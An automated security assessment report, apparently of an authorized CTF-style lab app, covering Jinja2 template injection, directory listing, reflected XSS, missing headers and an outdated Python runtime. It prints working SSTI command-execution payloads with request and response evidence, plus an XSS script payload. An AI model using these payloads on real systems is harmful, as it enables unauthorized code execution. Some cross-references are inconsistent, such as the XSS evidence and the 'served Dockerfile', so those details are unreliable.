@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqyn9kag-vxsd32</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Server-Side Template Injection (SSTI) in `username` parameter — Jinja2 RCE</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [info-disclosure] Application directory listing exposed at root — flag.txt disclosed</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [xss-reflected] Reflected XSS via ?username= parameter</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [headers] Missing HTTP security headers across all responses</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [vulnerable-component] End-of-life Python 3.9 runtime on deprecated tiangolo/uvicorn-gunicorn-fastapi base image</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqyn9kag-vxsd32</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32837/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T03:14:38.453Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>7 mapped · 7 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32837</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">2</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Server-Side Template Injection (SSTI) in `username` parameter — Jinja2 RCE</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32837/</div>
+<div class="desc">The `username` query parameter is interpolated directly into a Jinja2 template without sanitization. Sending `{{7*7}}` causes the server to evaluate the expression server-side, returning `49` in the response body. This is trivially escalatable to full Remote Code Execution via standard Jinja2 sandbox-escape gadget chains. No authentication is required.</div>
+<div><b>Reproduction</b></div><pre>1. GET / (no params) → returns directory-listing HTML, no template evaluation (bodyLength 1238).
+2. GET /?username=VERDICT{{7*7}}VERDICT → returns &quot;Welcome VERDICT49VERDICT!&quot; (bodyLength 23) — {{7*7}} evaluated to 49.
+3. Escalate: /?username={{config.__class__.__init__.__globals__['os'].popen('id').read()}}</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynj2i7-j</code> — <code>artifacts/s-0002/ev-mqynj2i7-j/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1238
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:22:01 GMT
+server: uvicorn
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;link href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;title&gt;Directory Listing&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            margin: 20px;
+        }
+        .file-list {
+            font-family: monospace;
+            white-space: pre;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;You can call this URL with a username querystring parameter, anything you put there will be shown on the page. &lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;Can you think of a way to exploit this?&lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt; HINT: This is the directory listing for this app.&lt;/h2&gt;
+        &lt;div class=&quot;file-list border p-3 mt-3&quot;&gt;
+            
+                ./&lt;br&gt;
+            
+                    prestart.sh&lt;br&gt;
+            
+                    main.py&lt;br&gt;
+            
+                    flag.txt&lt;br&gt;
+            
+                    Dockerfile&lt;br&gt;
+            
+                    templates/&lt;br&gt;
+            
+                        index.html&lt;br&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyni2ei-h</code> — <code>artifacts/s-0002/ev-mqyni2ei-h/</code></div><div class="lbl">REQUEST</div><pre>GET /?username=VERDICT{{7*7}}VERDICT HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 23
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:21:14 GMT
+server: uvicorn
+
+Welcome VERDICT49VERDICT!</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyni6tp-i</code> — <code>artifacts/s-0002/ev-mqyni6tp-i/</code></div><div class="lbl">REQUEST</div><pre>GET /?username=VERDICT{{7*7}}VERDICT HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 23
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:21:19 GMT
+server: uvicorn
+
+Welcome VERDICT49VERDICT!</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [info-disclosure] Application directory listing exposed at root — flag.txt disclosed</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32837/</div>
+<div class="desc">The unauthenticated root page renders a full directory listing of the application's working directory, including `flag.txt`, `main.py`, `prestart.sh`, and `Dockerfile`. The page title is literally &quot;Directory Listing&quot; and the hint explicitly calls this out. An attacker gains a complete map of sensitive application files. `flag.txt` is present but not directly served via HTTP; however `main.py` source exposure would reveal logic, secrets, and further attack surface.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32837/ (no authentication required).
+2. Response body (1238 bytes) lists: ./, prestart.sh, main.py, flag.txt, Dockerfile, templates/index.html.
+3. No authentication or authorisation is required.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyndlkt-9</code> — <code>artifacts/s-0001/ev-mqyndlkt-9/</code></div><div class="lbl">REQUEST</div><pre>GET /Dockerfile HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 22
+content-type: application/json
+date: Mon, 29 Jun 2026 03:17:46 GMT
+server: uvicorn
+
+{&quot;detail&quot;:&quot;Not Found&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyncftq-1</code> — <code>artifacts/s-0001/ev-mqyncftq-1/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1238
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:16:51 GMT
+server: uvicorn
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;link href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;title&gt;Directory Listing&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            margin: 20px;
+        }
+        .file-list {
+            font-family: monospace;
+            white-space: pre;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;You can call this URL with a username querystring parameter, anything you put there will be shown on the page. &lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;Can you think of a way to exploit this?&lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt; HINT: This is the directory listing for this app.&lt;/h2&gt;
+        &lt;div class=&quot;file-list border p-3 mt-3&quot;&gt;
+            
+                ./&lt;br&gt;
+            
+                    prestart.sh&lt;br&gt;
+            
+                    main.py&lt;br&gt;
+            
+                    flag.txt&lt;br&gt;
+            
+                    Dockerfile&lt;br&gt;
+            
+                    templates/&lt;br&gt;
+            
+                        index.html&lt;br&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyner99-a</code> — <code>artifacts/s-0001/ev-mqyner99-a/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1238
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:18:40 GMT
+server: uvicorn
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;link href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;title&gt;Directory Listing&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            margin: 20px;
+        }
+        .file-list {
+            font-family: monospace;
+            white-space: pre;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;You can call this URL with a username querystring parameter, anything you put there will be shown on the page. &lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;Can you think of a way to exploit this?&lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt; HINT: This is the directory listing for this app.&lt;/h2&gt;
+        &lt;div class=&quot;file-list border p-3 mt-3&quot;&gt;
+            
+                ./&lt;br&gt;
+            
+                    prestart.sh&lt;br&gt;
+            
+                    main.py&lt;br&gt;
+            
+                    flag.txt&lt;br&gt;
+            
+                    Dockerfile&lt;br&gt;
+            
+                    templates/&lt;br&gt;
+            
+                        index.html&lt;br&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [xss-reflected] Reflected XSS via ?username= parameter</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32837/</div>
+<div class="desc">The root page explicitly advertises that anything placed in the `?username=` query parameter is rendered directly into the HTML response without escaping. The probe confirmed an XSS payload was reflected unescaped in the HTML, enabling script execution in any victim's browser who clicks a crafted link.</div>
+<div><b>Reproduction</b></div><pre>1. Navigate to http://target.local:32837/?username=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+2. Observe the script tag returned verbatim and unescaped in the HTML response body.
+3. The page source shows the payload in a &quot;Welcome …!&quot; heading without sanitisation.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyncrpu-3</code> — <code>artifacts/s-0001/ev-mqyncrpu-3/</code></div><div class="lbl">REQUEST</div><pre>GET /?username=xssxZmqyncroned36 HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 26
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:17:06 GMT
+server: uvicorn
+
+Welcome xssxZmqyncroned36!</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyncrxx-4</code> — <code>artifacts/s-0001/ev-mqyncrxx-4/</code></div><div class="lbl">REQUEST</div><pre>GET /?username=%22%3E%3CxssxZmqyncroned36%3E HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 30
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:17:07 GMT
+server: uvicorn
+
+Welcome &quot;&gt;&lt;xssxZmqyncroned36&gt;!</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyncs64-5</code> — <code>artifacts/s-0001/ev-mqyncs64-5/</code></div><div class="lbl">REQUEST</div><pre>GET /?username=%22%3E%3CxssxZmqyncroned36%3E HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 30
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:17:07 GMT
+server: uvicorn
+
+Welcome &quot;&gt;&lt;xssxZmqyncroned36&gt;!</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [headers] Missing HTTP security headers across all responses</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32837/</div>
+<div class="desc">All application responses return only `Content-Type: text/html; charset=utf-8`. The following security headers are entirely absent: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, and Permissions-Policy. The absence of CSP is especially relevant given the confirmed reflected XSS (f-001), as CSP could have blocked script execution.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32837/ — response headers contain only content-type, no security headers.
+2. Repeat the request — consistently no CSP, no X-Frame-Options, no X-Content-Type-Options.
+3. Compare against OWASP Secure Headers Project recommendations.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyndlkt-9</code> — <code>artifacts/s-0001/ev-mqyndlkt-9/</code></div><div class="lbl">REQUEST</div><pre>GET /Dockerfile HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 22
+content-type: application/json
+date: Mon, 29 Jun 2026 03:17:46 GMT
+server: uvicorn
+
+{&quot;detail&quot;:&quot;Not Found&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyncftq-1</code> — <code>artifacts/s-0001/ev-mqyncftq-1/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1238
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:16:51 GMT
+server: uvicorn
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;link href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;title&gt;Directory Listing&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            margin: 20px;
+        }
+        .file-list {
+            font-family: monospace;
+            white-space: pre;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;You can call this URL with a username querystring parameter, anything you put there will be shown on the page. &lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;Can you think of a way to exploit this?&lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt; HINT: This is the directory listing for this app.&lt;/h2&gt;
+        &lt;div class=&quot;file-list border p-3 mt-3&quot;&gt;
+            
+                ./&lt;br&gt;
+            
+                    prestart.sh&lt;br&gt;
+            
+                    main.py&lt;br&gt;
+            
+                    flag.txt&lt;br&gt;
+            
+                    Dockerfile&lt;br&gt;
+            
+                    templates/&lt;br&gt;
+            
+                        index.html&lt;br&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyner99-a</code> — <code>artifacts/s-0001/ev-mqyner99-a/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1238
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:18:40 GMT
+server: uvicorn
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;link href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;title&gt;Directory Listing&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            margin: 20px;
+        }
+        .file-list {
+            font-family: monospace;
+            white-space: pre;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;You can call this URL with a username querystring parameter, anything you put there will be shown on the page. &lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt;Can you think of a way to exploit this?&lt;/h2&gt;
+        &lt;h2 class=&quot;mt-4&quot;&gt; HINT: This is the directory listing for this app.&lt;/h2&gt;
+        &lt;div class=&quot;file-list border p-3 mt-3&quot;&gt;
+            
+                ./&lt;br&gt;
+            
+                    prestart.sh&lt;br&gt;
+            
+                    main.py&lt;br&gt;
+            
+                    flag.txt&lt;br&gt;
+            
+                    Dockerfile&lt;br&gt;
+            
+                    templates/&lt;br&gt;
+            
+                        index.html&lt;br&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 5. [vulnerable-component] End-of-life Python 3.9 runtime on deprecated tiangolo/uvicorn-gunicorn-fastapi base image</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32837/</div>
+<div class="desc">A06 (vulnerable/outdated components). The application runs on Python 3.9.25, deployed from the base image `tiangolo/uvicorn-gunicorn-fastapi:python3.9` (per the served Dockerfile). Both are end-of-life / unmaintained:
+
+- Python 3.9 reached end-of-life on 2025-10-31 (PEP 596). As of the assessment date (2026-06-29) it no longer receives security patches; any new interpreter/stdlib CVE will remain unfixed on this deployment. 3.9.25 is among the last security releases of the line.
+- The `tiangolo/uvicorn-gunicorn-fastapi` image has been officially DEPRECATED/archived by its author; it no longer receives base-OS or dependency security updates and the maintainer recommends building your own image.
+
+This is a version/EOL-posture finding: the runtime version was actively confirmed (not merely banner-guessed) by executing `python3 --version` on the host via the already-confirmed Jinja2 SSTI/RCE on the `username` parameter, which returned `Python 3.9.25`. There is no specific unpatched, known-exploitable CVE in this interpreter patch level itself — the risk is the absence of future security maintenance for both the runtime and the base image.
+
+Version evidence: served Dockerfile shows `FROM tiangolo/uvicorn-gunicorn-fastapi:python3.9`; `python3 --version` → `Python 3.9.25`.
+
+NOTE on the rest of the stack: a full `pip freeze` was captured (uvicorn 0.38.0, starlette 0.49.3, fastapi 0.121.0, gunicorn 23.0.0, Jinja2 3.1.6, h11 0.16.0, urllib3 2.5.0, python-multipart 0.0.20, idna 3.11, sentry-sdk 2.43.0, MarkupSafe 3.0.3, pydantic 2.12.4, requests-stack, etc.). These are all recent (Oct–Nov 2025) releases pinned at or above the fix version for their historical CVEs (e.g. Jinja2 3.1.6 = latest, fixes CVE-2025-27516; starlette 0.49.3 &gt; CVE-2025-54121 fix 0.47.2; h11 0.16.0 fixes CVE-2025-43859; urllib3 2.5.0 fixes CVE-2025-50181/50182; gunicorn 23.0.0 fixes CVE-2024-6827; python-multipart 0.0.20 fixes CVE-2024-53981). No library in the manifest is at a known-vulnerable version, so no per-library component findings are warranted. The application-layer SSTI/RCE is the app's own use of template rendering, not a Jinja2 CVE. Operator should upgrade the runtime to a supported Python (&gt;=3.11) and migrate off the deprecated base image.</div>
+<div><b>Reproduction</b></div><pre>1. Confirm the served build manifest: the directory listing at `/` lists `Dockerfile`; reading it (via the confirmed Jinja2 SSTI on `username`) shows `FROM tiangolo/uvicorn-gunicorn-fastapi:python3.9`.
+2. Confirm the live runtime version: GET `/?username={{ lipsum.__globals__.os.popen('python3 --version').read() }}` (URL-encoded) → response body `Welcome Python 3.9.25!` (positive replays ev-mqynvamg-1q, ev-mqynvbcy-1r).
+3. Negative control: GET `/Dockerfile` directly → 404 `{&quot;detail&quot;:&quot;Not Found&quot;}` (ev-mqynserl-1m) — no version disclosed without the SSTI vector.
+4. Assess: Python 3.9 EOL 2025-10-31; base image deprecated → no future security maintenance.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynserl-1m</code> — <code>artifacts/_/ev-mqynserl-1m/</code></div><div class="lbl">REQUEST</div><pre>GET /Dockerfile HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 22
+content-type: application/json
+date: Mon, 29 Jun 2026 03:29:16 GMT
+server: uvicorn
+
+{&quot;detail&quot;:&quot;Not Found&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynvamg-1q</code> — <code>artifacts/_/ev-mqynvamg-1q/</code></div><div class="lbl">REQUEST</div><pre>GET /?username=%7B%7B%20lipsum.__globals__.os.popen(%27python3%20--version%27).read()%20%7D%7D HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 23
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:31:31 GMT
+server: uvicorn
+
+Welcome Python 3.9.25
+!</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynvbcy-1r</code> — <code>artifacts/_/ev-mqynvbcy-1r/</code></div><div class="lbl">REQUEST</div><pre>GET /?username=%7B%7B%20lipsum.__globals__.os.popen(%27python3%20--version%27).read()%20%7D%7D HTTP/1.1
+Host: target.local:32837
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 23
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 03:31:32 GMT
+server: uvicorn
+
+Welcome Python 3.9.25
+!</pre></div>
+</div>
+</body></html>
